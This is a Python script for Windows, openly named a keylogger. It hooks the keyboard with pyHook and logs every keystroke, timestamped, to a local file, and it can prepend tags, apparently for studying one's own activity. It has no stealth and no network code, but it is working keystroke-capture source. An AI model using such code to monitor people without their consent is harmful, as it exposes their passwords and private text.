import win32api
import win32console
import win32gui
import pythoncom
import pyHook

import argparse
import configparser
import sys
import os
from os.path import join

import logging
import time

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 1)

def init_logger():
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    formatter = logging.Formatter("%(asctime)s - %(message)s",
                                  "%H:%M:%S")
    ch.setFormatter(formatter)

    logger.addHandler(ch)
    return logger

def add_filehandler(log_dir, tags=None):
    logFileName = 'keylogger_{}.log'.format(time.strftime("%Y%m%d"))
    # optionally write provided tags as comment
    if tags:
        with open(join(log_dir, logFileName), 'w+') as f:
            f.write("# TAGS {} \n".format(tags))
    fh = logging.FileHandler(join(log_dir, logFileName))
    fh.setLevel(logging.INFO)
    formatter = logging.Formatter("%(asctime)s,%(message)s",
                                  "%Y-%m-%d %H:%M:%S")
    fh.setFormatter(formatter)
    logger.addHandler(fh)

logger = init_logger()

def on_keyboard_event(event):
    logger.info("KB,{}".format(event.GetKey()))
    return True

def on_mouse_event(event):
    logger.info('MS,"{}"_"{}"_"{}"'.format(event.Position, event.MessageName, event.WindowName))
    return True

def main(_):
    parser = argparse.ArgumentParser(description='Keylogger')
    parser.add_argument('-o', metavar='log_dir', dest='log_dir', default='logs')
    parser.add_argument('-t', metavar='tags', dest='tags', default='',
                        help='string to pre-append as comment to log file')

    args = parser.parse_args()
    log_dir = args.log_dir
    tags = args.tags

    add_filehandler(log_dir, tags)

    # create a hook manager object
    hm = pyHook.HookManager()

    # set events for mouse and keyboard
    hm.KeyDown = on_keyboard_event
    hm.SubscribeMouseAllButtonsDown(on_mouse_event)
    #hm.MouseAll = on_mouse_event

    # set the hooks
    #hm.HookMouse()
    hm.HookKeyboard()

    # wait forever
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main(sys.argv[1:])